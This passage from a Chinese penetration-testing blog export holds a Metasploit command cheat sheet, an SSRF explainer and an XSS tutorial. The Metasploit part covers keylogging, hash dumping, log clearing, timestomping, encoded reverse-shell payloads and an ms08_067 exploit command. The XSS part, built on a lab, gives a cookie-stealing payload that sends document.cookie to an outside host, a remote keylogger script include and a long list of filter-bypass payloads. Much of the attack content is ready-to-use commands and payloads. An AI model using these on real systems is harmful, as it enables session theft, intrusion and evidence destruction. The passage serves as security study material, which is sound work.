<p>针对远程目标主机开启键盘记录功能。</p>
<p>keyscan_dump</p>
<p>存储目标主机上捕获的键盘记录。</p>
<p>keyscan_stop</p>
<p>停止针对目标主机的键盘记录。</p>
<p>getprivs</p>
<p>尽可能多的获取目标主机上的特权。</p>
<p>uictl enable keyboard/mouse</p>
<p>接管目标主机的键盘和鼠标。</p>
<p>background</p>
<p>将你当前的metasploit shell转为后台执行。</p>
<p>hashdump</p>
<p>导出目标主机中的口令哈希值。</p>
<p>use sniffer</p>
<p>加载嗅探模式。</p>
<p>sniffer_interfaces</p>
<p>列出目标主机所有开放的网络端口。</p>
<p>sniffer_dump interfaceID pcapname</p>
<p>在目标主机上启动嗅探。</p>
<p>sniffer_start interfaceID packet-buffer</p>
<p>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</p>
<p>sniffer_stats interfaceID</p>
<p>获取正在实施嗅探网络接口的统计数据。</p>
<p>sniffer_stop interfaceID</p>
<p>停止嗅探。</p>
<p>add_user username password -h ip</p>
<p>在远程目标主机上添加一个用户。</p>
<p>clearev</p>
<p>清楚目标主机上的日志记录。</p>
<p>timestomp</p>
<p>修改文件属性，例如修改文件的创建时间（反取证调查）。</p>
<p>reboot</p>
<p>重启目标主机。</p>
</blockquote>
<h3 id="MSFpayload命令"><a href="#MSFpayload命令" class="headerlink" title="MSFpayload命令"></a><strong><em>MSFpayload命令</em></strong></h3><blockquote>
<p>msfpayload -h</p>
<p>msfpayload的帮助信息。</p>
<p>msfpayload windows/meterpreter/bind_tcp O</p>
<p>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。</p>
<p>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。</p>
<p>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。</p>
<p>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。</p>
<p>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。</p>
</blockquote>
<h3 id="msfencode命令"><a href="#msfencode命令" class="headerlink" title="msfencode命令"></a><strong><em>msfencode命令</em></strong></h3><blockquote>
<p>mefencode -h</p>
<p>列出msfencode的帮助命令。</p>
<p>msfencode -l</p>
<p>列出所有可用的编码器。</p>
<p>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)</p>
<p>显示编码缓冲区的格式。</p>
<p>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</p>
<p>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。</p>
<p>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</p>
<p>创建一个经过多种编码格式嵌套编码的攻击载荷。</p>
<p>msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c</p>
<p>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。</p>
</blockquote>
<h3 id="MSFcli命令"><a href="#MSFcli命令" class="headerlink" title="MSFcli命令"></a><strong><em>MSFcli命令</em></strong></h3><blockquote>
<p>msfcli | grep exploit</p>
<p>仅列出渗透攻击模块。</p>
<p>msfcli | grep exploit/windows</p>
<p>仅列出与windows相关的渗透攻击模块。</p>
<p>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E</p>
<p>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听</p>
</blockquote>
<h2 id="如何更新MSF"><a href="#如何更新MSF" class="headerlink" title="如何更新MSF"></a>如何更新MSF</h2><h3 id="1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http-www-kali-org-downloads"><a href="#1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http-www-kali-org-downloads" class="headerlink" title="1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：http://www.kali.org/downloads/"></a>1、🐱‍🐉直接在kali官网下载最新版本，一个星期更新一次。官方地址：<a href="http://www.kali.org/downloads/">http://www.kali.org/downloads/</a></h3><p>kail下载地址：</p>
<p>[<strong><a href="https://pan.baidu.com/s/1c05BnlI">https://pan.baidu.com/s/1c05BnlI</a></strong></p>
<p><a href="http://cdimage.kali.org/kali-weekly/">http://cdimage.kali.org/kali-weekly/</a></p>
<p><a href="http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/">http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/</a></p>
<p>注意: 测试系统下载下来后是zip格式的。解压后使用VM打开。如果是VMware的，直接打开用VMware打开Metasploitable.vmx文件即可。Metasploitable系统的默认账号和密码是msfadmin:msfadmin如果你想了解更多关于Metasploitable的信息，你可以去下面这个网站：<a href="https://community.rapid7.com/docs/DOC-1875">https://community.rapid7.com/docs/DOC-1875</a></p>
<h3 id="2🐱‍🚀、加入更新源"><a href="#2🐱‍🚀、加入更新源" class="headerlink" title="2🐱‍🚀、加入更新源"></a>2🐱‍🚀、加入更新源</h3><p>一、替换yum源，把kail原有更新源#号注释掉</p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-1ab4263a437bd7db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/554/format/webp" alt="img"></p>
<p>root@kali:~#vi /etc/apt/sources.list（这是修改更新源）</p>
<p>（更新源全国各地都不一样，因为当地的电信，移动防火墙会拦截）</p>
<p>kali-rolling版本：（中科大的就够用了，个人按需吧）</p>
<p># kali官方源</p>
<p>deb <a href="http://http.kali.org/">http://http.kali.org/</a> kali-rolling main non-free contrib</p>
<p>deb-src <a href="http://http.kali.org/">http://http.kali.org/</a> kali-rolling main non-free contrib</p>
<p>#中科大源</p>
<p>deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-56458e7248e32cb3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1069/format/webp" alt="img"></p>
<p>shift+：wq保存退出</p>
<h3 id="添加数字签名"><a href="#添加数字签名" class="headerlink" title="添加数字签名"></a>添加数字签名</h3><p>wget archive.kali.org/archive-key.asc   //下载签名</p>
<p>apt-key add archive-key.asc   //安装签名</p>
<p>注：如果添加数字签名还提示无法安装可删除原有msf</p>
<p>root@kali:~# apt remove metasploit-framework</p>
<p><strong>注：</strong>卸载过程中无法获得锁/var/cache/apt/archives/lock - open (11:资源暂时不可用)</p>
<p>无法对目录/var/cache/apt/archives/加锁</p>
<p>root@kali:~# sudo rm /var/cache/apt/archives/lock  //进行强制解锁</p>
<p>root@kali:~# sudo rm /var/cache/apt/archives/ </p>
<hr>
<h2 id="安装msf框架"><a href="#安装msf框架" class="headerlink" title="安装msf框架"></a><strong>安装msf框架</strong></h2><p><strong>oot@bogon:~# apt-get update</strong></p>
<p>root@kali:~# apt-get  install metasploit-framework//安装msf框架</p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-cf4550c3ebbdb454.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/811/format/webp" alt="img"></p>
<p>选择yes说明更新成功</p>
<p>root@kali:~#msfconsole   //发现有提示数据库未启动，退出msf启动数据库</p>
<p>root@kali:~# systemctl start postgresql  //启动数据库</p>
<p>root@kali:~# systemctl enable postgresql //允许开机自启动</p>
<p>root@kali:~# msfdb init //构建数据库缓存</p>
<p>root@kali:~#msfconsole</p>
<hr>
<p>注意：如果更新完msf出现才下问题</p>
<p>root@kaliew:~# msfconsole</p>
<p>[*] Bundler failed to load and returned this error:</p>
<p>   ‘cannot load such file – bundler/setup’</p>
<p>[*] You may need to uninstall or upgrade bundler</p>
<p>解决方法：</p>
<p>root@kaliew:~# sudo gem install bundler</p>
<p>root@kaliew:~# bundle update celluloid</p>
<h2 id="MSF之meterpreter后期攻击使用方法"><a href="#MSF之meterpreter后期攻击使用方法" class="headerlink" title="MSF之meterpreter后期攻击使用方法"></a>MSF之meterpreter后期攻击使用方法</h2><p><a href="https://www.jianshu.com/nb/46943313">https://www.jianshu.com/nb/46943313</a></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF服务端请求伪造</title>
    <url>/2019/08/08/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0.png"></p>
<h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>      服务器端请求伪造：是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，ssrf是要目标网站的内部系统，因为他是从内部系统访问的，所有可能通过它攻击外网无法访问的内部系统，也就是说把目标网站当中间人</p>
<h2 id="形成原因："><a href="#形成原因：" class="headerlink" title="形成原因："></a>形成原因：</h2><p>       大都是由于服务器提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制</p>
<p>       比如从指定url获取网页文本内容，加载指定网站的图片，文档等</p>
<h2 id="漏洞的挖掘："><a href="#漏洞的挖掘：" class="headerlink" title="漏洞的挖掘："></a>漏洞的挖掘：</h2><h3 id="1、通过web功能寻找"><a href="#1、通过web功能寻找" class="headerlink" title="1、通过web功能寻找"></a>1、通过web功能寻找</h3><p>1）分享：通过URL地址分享网页内容</p>
<p>2）转码服务</p>
<p>3）在线翻译</p>
<p>4）图片加载与下载：通过URL地址加载或下载图片</p>
<p>5）图片、文章收藏功能</p>
<p>6）未公开的api实现以及其他调用URL的功能</p>
<h3 id="2、通过url关键字寻找share"><a href="#2、通过url关键字寻找share" class="headerlink" title="2、通过url关键字寻找share"></a>2、通过url关键字寻找share</h3><ul>
<li>wap</li>
<li>url</li>
<li>link</li>
<li>src</li>
<li>source</li>
<li>target</li>
<li>u</li>
<li>3g</li>
<li>display</li>
<li>sourceURl</li>
<li>imageURL</li>
<li>domain</li>
</ul>
<h3 id="3、通过扫描器工具寻找"><a href="#3、通过扫描器工具寻找" class="headerlink" title="3、通过扫描器工具寻找"></a>3、通过扫描器工具寻找</h3><h2 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h2><ol>
<li><p>更改ip地址写法：转换进制</p>
</li>
<li><p>利用解析url出现的问题</p>
<p><a href="http://www.oldboyedu.com@192.168.0.1/">httP://www.oldboyedu.com@192.168.0.1/</a></p>
<p>不正确的正则匹配：http之后到com之前</p>
</li>
<li><p>利用协议</p>
</li>
</ol>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>（黑名单）</p>
<p>（1）过滤10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址</p>
<p>（2）过滤file:///、dict://、gopher://、ftp:// 危险schema</p>
<p>（3）对返回的内容进行识别</p>
<p>（4）内网服务开启鉴权（Memcached, Redis, Elasticsearch and MongoDB）</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站脚本攻击</title>
    <url>/2019/09/12/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="xss总结图"><a href="#xss总结图" class="headerlink" title="xss总结图"></a>xss总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.png"></p>
<h2 id="xss攻击图"><a href="#xss攻击图" class="headerlink" title="xss攻击图"></a>xss攻击图</h2><p><img src="/image/xss/xss%E6%94%BB%E5%87%BB%E5%9B%BE.jpg"></p>
<h2 id="一、什么是-XSS"><a href="#一、什么是-XSS" class="headerlink" title="一、什么是 XSS"></a>一、什么是 XSS</h2><p>XSS全称（Cross Site Scripting）跨站脚本攻击，是最常见的Web应用程序安全漏洞之一。XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的危险代码，当用户使用浏览器浏览网时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。</p>
<h2 id="二、XSS漏洞出现的原因"><a href="#二、XSS漏洞出现的原因" class="headerlink" title="二、XSS漏洞出现的原因"></a>二、XSS漏洞出现的原因</h2><p>程序对输入和输出的控制不够严格,导致”精心构造“的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害.</p>
<h2 id="三、XSS的危害"><a href="#三、XSS的危害" class="headerlink" title="三、XSS的危害"></a>三、XSS的危害</h2><p>1、首先对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用。一般在各类的社交平台，邮件系统，开源流行的Web应用，BBS，微博等场景中，造成的杀伤力却十分强大。<br>2、劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。<br>3、“框架钓鱼”。利用JS脚本的基本功能之一：操作网页中的DOM树结构和内容，在网页中通过JS脚本，生成虚假的页面，欺骗用户执行操作，而用户所有的输入内容都会被发送到攻击者的服务器上。<br>4、挂马（水坑攻击）<br>5、有局限性的键盘记录</p>
<h2 id="四、-XSS分类"><a href="#四、-XSS分类" class="headerlink" title="四、 XSS分类"></a>四、 XSS分类</h2><p>1、反射型XSS或不持久型XSS(中危)<br>交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line">&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;&#x2F;sCrIpT&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">echo &quot;Welcome $name</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2、储存型XSS 或持久型 XSS（高危）<br>交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性</p>
<p>3、DOM XSS<br>不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。<br>什么是DOM:DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的。<br><a href="https://links.jianshu.com/go?to=https://www.w3school.com.cn/htmldom/index.asp">https://www.w3school.com.cn/htmldom/index.asp</a><br><code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;</code><br><code>&lt;a href=&#39;#&#39; onclick=&quot;alert(1111)&quot;&gt;what do you see?&lt;/a&gt;</code><br><code>&lt;a href=&#39;#&#39; onclick=&quot;alert(2222)&quot;&gt;what do you see?&lt;/a&gt;</code></p>
<h2 id="五、XSS可能存在的地方"><a href="#五、XSS可能存在的地方" class="headerlink" title="五、XSS可能存在的地方"></a>五、XSS可能存在的地方</h2><p>HTML context<br>Attribute Context<br>URL Context<br>Style Context<br>Script Context</p>
<h2 id="六、XSS测试方法"><a href="#六、XSS测试方法" class="headerlink" title="六、XSS测试方法"></a>六、XSS测试方法</h2><p>1、工具扫描：APPscan、AWVS<br>2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF<br>使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。<br>（1）在目标站点上找到输入点,比如查询接口,留言板等;<br>（2）输入一组”特殊字符+唯一识别字符”,点击提交后,查看返回的源码,是否有做对应的处理;<br>（3）通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;</p>
<h2 id="七、实战"><a href="#七、实战" class="headerlink" title="七、实战"></a>七、实战</h2><p>1、xss平台搭建及后台使用（cookie获取）<br><code>&#39;&quot;&gt;&lt;script&gt;document.location = &#39;http://192.168.0.113/pikachu/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie;&lt;/script&gt;</code></p>
<p>//通过document.location 实例进行重定向到<a href="https://links.jianshu.com/go?to=http://127.0.0.1/pikachu/index.php">http://127.0.0.1/pikachu/index.php</a><br>php版本影响实验结果</p>
<p>2、反射型XSS(POST)获取用户密码<br>post攻击利用页面   D:\phpStudy\WWW\pikachu\pkxss\xcookie\post.html<br><a href="https://links.jianshu.com/go?to=http://192.168.0.113:80/post.html">http://192.168.0.113:80/post.html</a></p>
<p>3、xss钓鱼演示<br>钓鱼攻击利用页面   E:\phpStudy\WWW\pikachu\pkxss\xfish</p>
<p>4、xss获取键盘记录演示</p>
<p>(1)、什么是跨域</p>
<p>​    http:// www.   oldboyedu.com  :80 /   news/index.php</p>
<p>协议  子域名        主域名         端口资源地址</p>
<p>​    当协议、主机(主域名，子域名)、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。</p>
<p>(2)、同源策略</p>
<p>​    为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象</p>
<p>​    那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</p>
<p>Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p>
<p><code>&lt;script src=&quot;...&quot;&gt;</code>  //加载本地js执行</p>
<p><code>&lt;img src=&quot;C:/blog/source/_posts/...&quot;&gt;  </code>//图片</p>
<p><code>&lt;link href=&quot;...&quot;&gt;</code>  //css</p>
<p><code>&lt;iframe src=&quot;...&quot;&gt;</code>  //任意资源</p>
<p>(3)、同源策略修改</p>
<p>​    E:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php</p>
<p>​    同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。</p>
<p>(4）rk.js关键代码解读</p>
<p>​    var realkey = String.fromCharCode(event.keyCode);  //获取用户键盘记录，最后转化为字符串</p>
<p>​    xl+=realkey;   //赋值给x1</p>
<p>​    show();    //调用show函数，通过下面ajax进行post发送键盘记录人内容</p>
<p>输入设置好的恶意JS代码：</p>
<p><code>&lt;script src=&quot;http://192.168.3.60/pikachu/pkxss/rkeypress/rk.js&quot;&gt;&lt;/script&gt;</code></p>
<p>然后在键盘上随意输入，就可以到xss平台上去查看键盘输入的结果</p>
<h2 id="八、xss如何绕过及安全防范"><a href="#八、xss如何绕过及安全防范" class="headerlink" title="八、xss如何绕过及安全防范"></a>八、xss如何绕过及安全防范</h2><p>多数网站为了避免xss的攻击，对于攻击者的输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的。但是仍存在一些漏洞可以利用，来绕过过滤措施。</p>
<p>​    xss绕过的方法有许多，主要取决于攻击者的思路和对前端技术的掌握，以下介绍几个简单的绕过方法。</p>
<p>（1）对前端的限制可以尝试进行抓包重发或者修改前端的HTML。</p>
<p>（2）防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。</p>
<p> 例：<code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code></p>
<p>（3）防止后台对输入的内容进行替换，采用拼拼凑的输入方法。</p>
<p> 例：<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;script&gt;ipt&gt;</code></p>
<p>（4）使用注释来干扰后台对输入内容的识别。</p>
<p> 例：<code>&lt;sc&lt;!--test--&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;!--tshauie--&gt;ipt&gt;</code></p>
<p>（5）编码</p>
<p> 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）</p>
<p>  例：使用事件属性onerror():</p>
<p><code>&lt;img src=# onerror=&quot;alert(&#39;oldboy&#39;)&quot;/&gt;</code></p>
<p>​    使用HTML进行编码：</p>
<p>` &lt;img src=x</p>
<p>onerror=”&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;”/&gt;`</p>
<p> （6）样式绕过</p>
<p>`&lt;div style=”color: ‘&lt;’; color:</p>
<p>expression(alert(‘XSS’))”&gt;`</p>
<p>(7)XSS绕过之htmlspecialchars()函数</p>
<p>htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体。yangshiy</p>
<p>预定义的字符是：</p>
<p> &amp; (和号)成为 &amp;amp</p>
<p> “ (双引号)成为 &amp;quot</p>
<p> ’ (单引号)成为&amp;#039</p>
<p> &lt;(小于)成为 &amp;lt</p>
<p><code>&gt;</code>(大于)成为 &amp;gt</p>
<p>该函数的语法：htmlspecialchars(string,flags,character-set,double_encode)</p>
<p>过滤原理：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号</p>
<p>可用的quotestyle类型：</p>
<p>ENT_COMPAT - 默认。仅编码双引号</p>
<p>ENT_QUOTES - 编码双引号和单引号</p>
<p>ENT_NOQUOTES - 不编码任何引号</p>
<p>可使用以下语句绕过：  q’ onclick=’alert(111)’</p>
<p> (8) xss之href输出绕过：javascript:alert(1111)直接代入a标签herf里面一样可以绕过htmlspecialchars</p>
<p> (9) xss之js输出绕过：<code>1&#39;&lt;/script&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</code></p>
<p> 思路：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）</p>
<p>phpstudy配置伪静态</p>
<p><a href="https://links.jianshu.com/go?to=https://jingyan.baidu.com/article/e9fb46e151a6557521f766d6.html">https://jingyan.baidu.com/article/e9fb46e151a6557521f766d6.html</a></p>
<p>伪静态注入的总结</p>
<p><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/jsq16/p/5942003.html">https://www.cnblogs.com/jsq16/p/5942003.html</a></p>
<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。例如输入：</p>
<p><code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code></p>
<hr>
<p>管理员后台：  <a href="http://http//192.168.0.113/pikachu/vul/xss/xssblind/admin_login.php">http://http://192.168.0.113/pikachu/vul/xss/xssblind/admin_login.php</a> </p>
<h2 id="跨站语句"><a href="#跨站语句" class="headerlink" title="跨站语句"></a>跨站语句</h2><p><code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt; </code>  大小写绕过<br><code>&#39;&quot;&gt;&lt;IFRAME SRC=javascript:alert(&#39;XSXSSSs&#39;)&gt;&lt;/IFRAME&gt;</code><br><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XXSSSS&quot;)&lt;/scr&lt;/script&gt;ipt&gt;</code>  过滤script绕过<br><code>&lt;img src=&quot;&quot;onerror=&quot;alert(&#39;xss&#39;)&quot;&gt; </code>  直接k掉script绕过<br><code>&lt;script&gt;eval(string.fromcharcode(97,108,101,114,116,40,39,120,115,115,39,41))&lt;/script&gt;  </code>包含alert就绕过（括号一串数字是alert(xss)的ASCII值）<br><code>&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>  构造js绕过<br>‘;alert(‘xss’);’   htmlentities没有过滤单引号，直接用单引号绕过。<br><code>..../example8.php/[/url]&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; &quot;&lt;</code>   当post 地址使用了当前url的时候，可这样绕过<br><code>..../example9.php#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; </code> 通过构造一个带xss的锚点绕过<br><code>&lt;script&gt;1&lt;(br=1)*/%0dalert(1)&lt;/script&gt;=&lt;script&gt;1&lt;(br=1)*/&lt;br/&gt;</code>alert(1)</script>   过chrome默认xss过滤器<br><a href="http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0Deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx">http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF%3C/script%3E%3Cscript%3E1%3C(br=1)*/%0deval(atob(location.hash.substr(1)))%3C/script%3E#xxxxxx</a></p>
<p>%22Onclick%3D(outerHTML%3DURL)|%26quot#&lt;img/src=# onerror=alert()&gt;<br>%27%29%0D%0Aalert%28document.cookie%29%2F%2F</p>
<p><code>&lt;script&gt;alert(&quot;跨站&quot;)&lt;/script&gt;</code>    (最常用）<br><code>&lt;img scr=javascript:alert(&quot;跨站&quot;)&gt;&lt;/img&gt;</code></p>
<p><a href="http://www.example.com/MyApp.aspx?myvar=">http://www.example.com/MyApp.aspx?myvar=</a> “&gt;&lt;/XSS/*-*/STYLE=xss:e/**/xpression(alert(‘XSS’))&gt;</p>
<p><code>&lt;IFRAME SRC=javascript:alert(&#39;test&#39;)&gt;&lt;/IFRAME&gt;</code><br>“ onclick=”alert(1)”<br><code>&lt;img scr=&quot;javascrip&amp;#116&amp;#58 alert(/跨站/)&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;javas????cript:alert(/跨站/)&quot; width=150&gt;&lt;/img&gt;</code> (?用tab键弄出来的空格）<br><code>&lt;img scr=&quot;#&quot; onerror=alert(/跨站/)&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;#&quot; style=&quot;xss:expression(alert(/xss/));&quot;&gt;&lt;/img&gt;</code><br><code>&lt;img scr=&quot;#&quot;/* */onerror=alert(/xss/) width=150&gt;&lt;/img&gt;</code> (/**/ 表示注释）<br><code>&lt;img src=vbscript:msgbox (&quot;xss&quot;)&gt;&lt;/img&gt;</code><br><code>&lt;style&gt; input &#123;left:expression (alert(&#39;xss&#39;))&#125;&lt;/style&gt;</code><br><code>&lt;div style=&#123;left:expression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br><code>&lt;div style=&#123;left:exp/* */ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br><code>&lt;div style=&#123;left:\0065\0078ression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br>html 实体 <code>&lt;div style=&#123;left:&amp;#ｘ0065；xpression (alert(&#39;xss&#39;))&#125;&gt;&lt;/div&gt;</code><br>unicode <code>&lt;div style=&quot;&#123;left:expRessioN (alert(&#39;xss&#39;))&#125;&quot;&gt;</code></p>
<p><code>&quot;]&#125;%3Cscript%3Ealert(&#39;By b14ckb0y&#39;)%3C/script%3E&#123;[&amp;item=&quot;]&lt;iframe%20src=http://new.qzone.qq.com/9530772%20width=400%20height=600&gt;&lt;/iframe&gt;[&quot;</code></p>
<p>/peixun/Search.asp?Field=&amp;Keyword=&amp;ClassID=0&amp;page=2<br><code>/peixun/Search.asp?Field=&#39;/&gt;&lt;script&gt;alert(451)&lt;/script&gt;&amp;Keyword=&amp;ClassID=0&amp;page=2</code></p>
<p>Referer: <code>&#39;&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(312)&lt;/script&gt; </code> 传送头插入</p>
<p>/peixun/Search.asp?Field=%27%22%3E%3Ciframe+id%3D445+src%3Dhttp%3A%2F%2Fdemo.testfire.net%2Fphishing.html%3E</p>
